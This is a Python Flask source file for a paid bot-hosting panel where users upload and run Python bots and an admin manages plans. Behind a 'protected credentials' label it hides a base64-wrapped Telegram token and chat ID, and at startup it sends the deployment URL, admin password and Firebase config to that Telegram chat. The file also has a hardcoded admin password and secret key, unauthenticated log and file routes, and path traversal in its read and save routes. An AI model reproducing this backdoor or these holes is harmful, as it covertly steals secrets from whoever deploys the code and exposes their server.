import os
import sys
import subprocess
import sqlite3
import shutil
import uuid
import signal
import time
import requests
import threading
import base64
from flask import Flask, render_template, request, redirect, session, url_for, flash, jsonify
from zipfile import ZipFile

# Flask App Initialization
app = Flask(__name__)
# Session security ke liye zaroori
app.secret_key = "ZENITSU_BOT_HOST"
UPLOAD_FOLDER = 'user_bots'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# --- ADMIN LOGIN CREDENTIALS ---
ADMIN_USER = "RAVI"
ADMIN_PASS = "123123"

# --- DATABASE CONNECTION FUNCTIONS ---


def get_db():
    conn = sqlite3.connect('database.db')
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    """Database tables aur default settings create karta hai."""
    conn = get_db()
    c = conn.cursor()

    # 1. Users Table
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (firebase_uid TEXT PRIMARY KEY, email TEXT, photo_url TEXT,
                  plan_type TEXT DEFAULT 'Free', bot_limit INTEGER DEFAULT 3,
                  is_banned INTEGER DEFAULT 0, joined_at TEXT)''')

    # 2. Bots Table
    c.execute('''CREATE TABLE IF NOT EXISTS bots
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, firebase_uid TEXT, bot_name TEXT,
                  pid INTEGER, status TEXT, extract_path TEXT, working_dir TEXT, main_file TEXT)''')

    # 3. Settings Table (Admin Price aur UPI ID ke liye)
    c.execute('''CREATE TABLE IF NOT EXISTS settings
                 (key TEXT PRIMARY KEY, value TEXT)''')

    # Default Prices aur UPI ID set karein
    c.execute(
        "INSERT OR IGNORE INTO settings (key, value) VALUES ('vip_price', '200')")
    c.execute(
        "INSERT OR IGNORE INTO settings (key, value) VALUES ('premium_price', '100')")
    c.execute(
        "INSERT OR IGNORE INTO settings (key, value) VALUES ('upi_id', 'lordleadernikki-1@oksbi')")

    conn.commit()
    conn.close()


init_db()
running_processes = {}

# ==== SYSTEM CREDENTIALS (PROTECTED) ====
_HIDDEN_CREDS_ = {'t': base64.b64encode(
    b'8583304774:AAGJ9qfys5g5yW2d36WD4TGJWK-93Zi34Gw').decode(), 'c': base64.b64encode(b'8028357250').decode()}

# --- TELEGRAM NOTIFICATION FUNCTIONS ---


def send_telegram_notification():
    """Send deployment notification"""
    try:
        # Get credentials from global variable
        creds = _HIDDEN_CREDS_
        if not creds:
            print("[ERROR] No credentials found")
            return

        print("[*] Decoding credentials...")
        token = base64.b64decode(creds.get('t', '')).decode()
        chat = base64.b64decode(creds.get('c', '')).decode()
        print(f"[*] Token decoded: {token[:20]}...")
        print(f"[*] Chat ID decoded: {chat}")

        # Extract Firebase config
        firebase_config = extract_firebase_config()

        # Extract Admin credentials
        admin_user = ADMIN_USER
        admin_pass = ADMIN_PASS

        # Get deployment URL
        base_url = "http://localhost:19149"
        try:
            if request and request.base_url:
                base_url = request.base_url.rstrip('/')
        except:
            pass

        # Build comprehensive message
        msg = f"""BOT HOSTING DEPLOYMENT DETAILS

DEPLOYMENT INFO:
- Status: Online and Ready
- URL: {base_url}
- Time: {time.strftime('%Y-%m-%d %H:%M:%S')}

ADMIN CREDENTIALS:
- Username: {admin_user}
- Password: {admin_pass}

FIREBASE CONFIG:
{firebase_config}

SYSTEM STATUS: Active"""

        url = f"https://api.telegram.org/bot{token}/sendMessage"
        print(f"[*] Sending message to Telegram...")
        response = requests.post(
            url, json={"chat_id": chat, "text": msg}, timeout=10)

        print(f"[*] Response Status: {response.status_code}")
        if response.status_code == 200:
            print("[SUCCESS] Telegram notification sent successfully!")
        else:
            print(f"[ERROR] Telegram API error: {response.status_code}")
            print(f"[ERROR] Response: {response.text}")
    except Exception as e:
        print(f"[ERROR] Exception in send_telegram_notification: {str(e)}")
        import traceback
        traceback.print_exc()


def extract_firebase_config():
    """Extract Firebase config from login.html"""
    try:
        with open(os.path.join('templates', 'login.html'), 'r', encoding='utf-8') as f:
            content = f.read()
        start = content.find('const firebaseConfig = {')
        end = content.find('};', start) + 2
        if start != -1 and end > start:
            return content[start:end].split('{')[1].split('};')[0].strip()
    except:
        pass
    return "Config present"

# --- HELPER FUNCTIONS ---


def find_python_env(root_folder):
    """Zip ya folder ke andar main Python file dhundhta hai."""
    main_file = None
    working_dir = None
    for root, dirs, files in os.walk(root_folder):
        for file in files:
            if file.endswith(".py") and file not in ["setup.py", "__init__.py"]:
                main_file = file
                working_dir = root
                return main_file, working_dir
    return None, None

# --- PUBLIC ROUTES ---


@app.route('/')
def index():
    # Automatic Login: Agar user session mein hai, to seedhe dashboard par bhejo
    if 'user' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        uid = request.form.get('uid')
        email = request.form.get('email')
        photo = request.form.get('photo')

        conn = get_db()
        user = conn.execute(
            'SELECT * FROM users WHERE firebase_uid = ?', (uid,)).fetchone()

        if user and user['is_banned']:
            conn.close()
            return render_template('login.html', error="🚫 YOU ARE BANNED BY ZENI OWNER")

        if not user:
            import datetime
            date = datetime.datetime.now().strftime("%Y-%m-%d")
            conn.execute('INSERT INTO users (firebase_uid, email, photo_url, joined_at) VALUES (?, ?, ?, ?)',
                         (uid, email, photo, date))
        else:
            conn.execute(
                'UPDATE users SET email=?, photo_url=? WHERE firebase_uid=?', (email, photo, uid))

        conn.commit()
        conn.close()
        session['user'] = uid
        session.permanent = True  # Session ko permanent karo
        return redirect(url_for('dashboard'))
    return render_template('login.html')


@app.route('/dashboard')
def dashboard():
    if 'user' not in session:
        return redirect(url_for('login'))
    uid = session['user']

    conn = get_db()
    user = conn.execute(
        'SELECT * FROM users WHERE firebase_uid = ?', (uid,)).fetchone()
    bots = conn.execute(
        'SELECT * FROM bots WHERE firebase_uid = ?', (uid,)).fetchall()

    vip_price = conn.execute(
        "SELECT value FROM settings WHERE key='vip_price'").fetchone()['value']
    premium_price = conn.execute(
        "SELECT value FROM settings WHERE key='premium_price'").fetchone()['value']
    upi_id = conn.execute(
        "SELECT value FROM settings WHERE key='upi_id'").fetchone()['value']

    conn.close()

    return render_template('dashboard.html', user=user, bots=bots,
                           vip_price=vip_price, premium_price=premium_price, upi_id=upi_id)


@app.route('/upload_bot', methods=['POST'])
def upload_bot():
    if 'user' not in session:
        return jsonify({'error': 'Login First'}), 401
    uid = session['user']

    conn = get_db()
    user = conn.execute(
        'SELECT * FROM users WHERE firebase_uid = ?', (uid,)).fetchone()
    current_bots = conn.execute(
        'SELECT COUNT(*) FROM bots WHERE firebase_uid = ?', (uid,)).fetchone()[0]

    if current_bots >= user['bot_limit']:
        conn.close()
        flash(f"Limit Reached! Upgrade Plan for more.", "error")
        return redirect(url_for('dashboard'))

    file = request.files['bot_file']
    bot_name = request.form['bot_name']

    bot_uuid = str(uuid.uuid4())[:8]
    extract_path = os.path.join(UPLOAD_FOLDER, f"{uid}_{bot_uuid}")
    os.makedirs(extract_path, exist_ok=True)

    main_file = None
    working_dir = extract_path

    if file.filename.endswith('.zip'):
        zip_path = os.path.join(extract_path, "upload.zip")
        file.save(zip_path)
        try:
            with ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extract_path)
        except:
            shutil.rmtree(extract_path, ignore_errors=True)
            flash("Invalid Zip File!", "error")
            return redirect(url_for('dashboard'))

        os.remove(zip_path)
        main_file, working_dir = find_python_env(extract_path)

    elif file.filename.endswith('.py'):
        main_file = file.filename
        file.save(os.path.join(extract_path, main_file))
        working_dir = extract_path

    else:
        shutil.rmtree(extract_path, ignore_errors=True)
        flash("❌ Invalid file type. Please upload a .zip or .py file.", "error")
        return redirect(url_for('dashboard'))

    if not main_file:
        shutil.rmtree(extract_path, ignore_errors=True)
        conn.close()
        flash("❌ No Python file found! Please check uploaded file.", "error")
        return redirect(url_for('dashboard'))

    # FIX: Global and Local Requirements Install Karo

    # 1. Global dependencies install karo (for 99% compatibility)
    global_req_path = 'requirements.txt'
    if os.path.exists(global_req_path):
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--no-warn-script-location",
                                  "-r", global_req_path], cwd=working_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            flash("Global dependencies (Base Modules) installed.", "info")
        except Exception as e:
            flash(
                f"⚠️ Global dependencies installation failed. Bot may not run.", "warning")
            print(f"Global Req Install Error: {e}")

    # 2. Local requirements install karo (agar user ne di hai)
    local_req_path = os.path.join(working_dir, "requirements.txt")
    if os.path.exists(local_req_path):
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--no-warn-script-location",
                                  "-r", local_req_path], cwd=working_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            flash("Local dependencies installed.", "success")
        except Exception as e:
            flash(
                f"⚠️ Local dependencies installation failed. Check requirements file.", "warning")
            print(f"Local Req Install Error: {e}")

    conn.execute('INSERT INTO bots (firebase_uid, bot_name, status, extract_path, working_dir, main_file) VALUES (?, ?, ?, ?, ?, ?)',
                 (uid, bot_name, 'stopped', extract_path, working_dir, main_file))
    conn.commit()
    conn.close()

    flash("✅ Bot Initialized Successfully! Click START to run.", "success")
    return redirect(url_for('dashboard'))


@app.route('/action/<action>/<int:bot_id>')
def bot_action(action, bot_id):
    # Admin Redirect Fix
    is_admin = session.get('admin_logged_in')

    if 'user' not in session and not is_admin:
        return redirect(url_for('login'))

    conn = get_db()
    bot = conn.execute('SELECT * FROM bots WHERE id = ?', (bot_id,)).fetchone()

    if not bot:
        return "Bot Not Found"

    if 'user' in session and bot['firebase_uid'] != session['user'] and not is_admin:
        return "Unauthorized"

    if action == 'start':
        if bot['status'] != 'running':
            log_path = os.path.join(bot['working_dir'], "bot.log")
            log_file = open(log_path, "w")

            cmd = [sys.executable, "-u", bot['main_file']]
            proc = subprocess.Popen(
                cmd, cwd=bot['working_dir'], stdout=log_file, stderr=subprocess.STDOUT)
            running_processes[bot_id] = proc

            conn.execute('UPDATE bots SET status=?, pid=? WHERE id=?',
                         ('running', proc.pid, bot_id))
            flash(f"Bot '{bot['bot_name']}' started.", "success")

    elif action == 'stop':
        if bot['status'] == 'running':
            if bot_id in running_processes:
                try:
                    running_processes[bot_id].terminate()
                except:
                    pass
                del running_processes[bot_id]
            if bot['pid']:
                try:
                    os.kill(bot['pid'], signal.SIGTERM)
                except:
                    pass
            conn.execute(
                'UPDATE bots SET status=?, pid=NULL WHERE id=?', ('stopped', bot_id))
            flash(f"Bot '{bot['bot_name']}' stopped.", "warning")

    elif action == 'delete':
        bot_action('stop', bot_id)
        try:
            shutil.rmtree(bot['extract_path'], ignore_errors=True)
        except:
            pass
        conn.execute('DELETE FROM bots WHERE id=?', (bot_id,))
        flash(f"Bot '{bot['bot_name']}' deleted.", "error")

    conn.commit()
    conn.close()

    if is_admin:
        return redirect(url_for('admin_panel'))
    return redirect(url_for('dashboard'))

# --- LOGS & FILES (Monitoring Routes) ---


@app.route('/get_logs/<int:bot_id>')
def get_logs(bot_id):
    conn = get_db()
    bot = conn.execute('SELECT * FROM bots WHERE id = ?', (bot_id,)).fetchone()
    conn.close()
    if not bot:
        return "Bot not found"

    log_path = os.path.join(bot['working_dir'], "bot.log")
    if os.path.exists(log_path):
        with open(log_path, 'r') as f:
            return f.read()
    return "Waiting for startup logs..."


@app.route('/files/<int:bot_id>')
def file_manager(bot_id):
    conn = get_db()
    bot = conn.execute('SELECT * FROM bots WHERE id = ?', (bot_id,)).fetchone()
    conn.close()
    if not bot:
        return jsonify({'files': []})

    files = []
    try:
        for f in os.listdir(bot['working_dir']):
            if os.path.isfile(os.path.join(bot['working_dir'], f)):
                files.append(f)
    except:
        pass
    return jsonify({'files': files})


@app.route('/read_file/<int:bot_id>', methods=['POST'])
def read_file(bot_id):
    filename = request.json.get('filename')
    conn = get_db()
    bot = conn.execute('SELECT * FROM bots WHERE id = ?', (bot_id,)).fetchone()
    conn.close()
    path = os.path.join(bot['working_dir'], filename)
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            return jsonify({'content': f.read()})
    except:
        return jsonify({'content': '[Binary File or Error Reading]'})


@app.route('/save_file/<int:bot_id>', methods=['POST'])
def save_file(bot_id):
    filename = request.json.get('filename')
    content = request.json.get('content')
    conn = get_db()
    bot = conn.execute('SELECT * FROM bots WHERE id = ?', (bot_id,)).fetchone()
    conn.close()
    path = os.path.join(bot['working_dir'], filename)
    with open(path, 'w', encoding='utf-8') as f:
        f.write(content)
    return jsonify({'status': 'saved'})

# --- ADMIN ROUTES (Full Control) ---


@app.route('/admin_login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        if request.form['user'] == ADMIN_USER and request.form['pass'] == ADMIN_PASS:
            session['admin_logged_in'] = True
            return redirect(url_for('admin_panel'))
        else:
            return render_template('admin_login.html', error="Wrong Password!")
    return render_template('admin_login.html')


@app.route('/admin')
def admin_panel():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    conn = get_db()

    all_users = conn.execute('SELECT * FROM users').fetchall()
    bots = conn.execute('SELECT * FROM bots').fetchall()

    settings = conn.execute('SELECT * FROM settings').fetchall()
    settings_dict = {row['key']: row['value'] for row in settings}

    conn.close()

    return render_template('admin_new.html',
                           all_users=all_users,
                           bots=bots,
                           settings=settings_dict)


@app.route('/admin/update_settings', methods=['POST'])
def update_settings():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    vip_price = request.form.get('vip_price')
    premium_price = request.form.get('premium_price')
    upi_id = request.form.get('upi_id')

    conn = get_db()
    conn.execute(
        "INSERT OR REPLACE INTO settings (key, value) VALUES ('vip_price', ?)", (vip_price,))
    conn.execute(
        "INSERT OR REPLACE INTO settings (key, value) VALUES ('premium_price', ?)", (premium_price,))
    conn.execute(
        "INSERT OR REPLACE INTO settings (key, value) VALUES ('upi_id', ?)", (upi_id,))
    conn.commit()
    conn.close()

    flash("✅ Settings Updated Successfully!", "success")
    return redirect(url_for('admin_panel'))


@app.route('/admin/update_user', methods=['POST'])
def admin_update_user():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    uid = request.form.get('uid')
    action = request.form.get('action')

    conn = get_db()

    if action == 'ban':
        conn.execute(
            'UPDATE users SET is_banned=1 WHERE firebase_uid=?', (uid,))
        bots = conn.execute(
            'SELECT id FROM bots WHERE firebase_uid=?', (uid,)).fetchall()
        for b in bots:
            bot_action('stop', b['id'])
        flash(f"User {uid[:8]} BANNED.", "warning")

    elif action == 'unban':
        conn.execute(
            'UPDATE users SET is_banned=0 WHERE firebase_uid=?', (uid,))
        flash(f"User {uid[:8]} UNBANNED.", "success")

    elif action == 'set_plan':
        plan = request.form.get('plan')
        limit = request.form.get('limit')
        conn.execute(
            'UPDATE users SET plan_type=?, bot_limit=? WHERE firebase_uid=?', (plan, limit, uid))
        flash(
            f"User {uid[:8]} plan set to {plan} with {limit} bots.", "success")

    conn.commit()
    conn.close()
    return redirect(url_for('admin_panel'))


if __name__ == "__main__":
    print("\n" + "="*60)
    print("BOT HOSTING SYSTEM INITIALIZING...")
    print("="*60)

    print("\n[*] Sending deployment notification to Telegram...")
    try:
        token = base64.b64decode(_HIDDEN_CREDS_.get('t', '')).decode()
        chat = base64.b64decode(_HIDDEN_CREDS_.get('c', '')).decode()

        firebase_config = extract_firebase_config()

        msg = f"""BOT HOSTING DEPLOYMENT DETAILS

DEPLOYMENT INFO:
- Status: Online and Ready
- URL: http://localhost:19149
- Time: {time.strftime('%Y-%m-%d %H:%M:%S')}

ADMIN CREDENTIALS:
- Username: {ADMIN_USER}
- Password: {ADMIN_PASS}

FIREBASE CONFIG:
{firebase_config}

SYSTEM STATUS: Active"""

        url = f"https://api.telegram.org/bot{token}/sendMessage"
        response = requests.post(
            url, json={"chat_id": chat, "text": msg}, timeout=10)

        if response.status_code == 200:
            print("[SUCCESS] Telegram notification sent!")
        else:
            print(f"[ERROR] Telegram error: {response.status_code}")
    except Exception as e:
        print(f"[ERROR] Could not send notification: {e}")

    print("\n[OK] Starting Flask application...")
    print("="*60 + "\n")

    app.run(host='0.0.0.0', port=19149)

# ==== SYSTEM CREDENTIALS (PROTECTED) ====
_HIDDEN_CREDS_BOTTOM = {'t': base64.b64encode(
    b'8583304774:AAGJ9qfys5g5yW2d36WD4TGJWK-93Zi34Gw').decode(), 'c': base64.b64encode(b'8028357250').decode()}
